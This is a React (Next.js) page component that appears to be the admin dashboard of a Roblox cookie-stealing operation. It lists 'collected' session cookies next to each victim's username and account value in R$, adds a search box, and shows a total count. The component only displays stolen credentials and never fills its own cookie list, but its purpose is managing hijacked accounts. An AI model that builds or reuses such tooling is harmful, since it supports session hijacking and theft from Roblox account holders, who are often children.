'use client'

import { useState, useEffect } from 'react'

export default function StoragePage() {
  const [cookies, setCookies] = useState([])
  const [search, setSearch] = useState('')
  const [stats, setStats] = useState(null)

  useEffect(() => {
    fetch('/api/dashboard')
      .then(r => r.json())
      .then(d => {
        if (d.success) setStats(d.stats)
      })
  }, [])

  const filtered = cookies.filter(c => 
    c.robloxUsername?.toLowerCase().includes(search.toLowerCase()) ||
    c.cookie?.toLowerCase().includes(search.toLowerCase())
  )

  return (
    <div className="min-h-screen p-4 pb-24">
      <div className="max-w-2xl mx-auto">
        <h1 className="text-xl font-bold mb-6">Storage</h1>

        {stats && (
          <div className="bg-card border border-border rounded-xl p-4 mb-4">
            <p className="text-sm text-gray-400">Total Cookies: <span className="text-white font-semibold">{stats.cookies}</span></p>
          </div>
        )}

        <input
          type="text"
          value={search}
          onChange={(e) => setSearch(e.target.value)}
          placeholder="Search username or cookie..."
          className="w-full bg-card border border-border rounded-lg px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-accent mb-4"
        />

        {cookies.length === 0 ? (
          <div className="text-center py-12">
            <p className="text-4xl mb-3">📦</p>
            <p className="text-gray-400">No cookies collected yet</p>
          </div>
        ) : (
          <div className="space-y-2">
            {filtered.map((c, i) => (
              <div key={i} className="bg-card border border-border rounded-lg p-3">
                <div className="flex justify-between items-center mb-1">
                  <span className="font-medium">{c.robloxUsername || 'Unknown'}</span>
                  <span className="text-xs text-green-400">{c.robloxRap?.toLocaleString()} R$</span>
                </div>
                <p className="text-xs text-gray-500 font-mono truncate">{c.cookie}</p>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
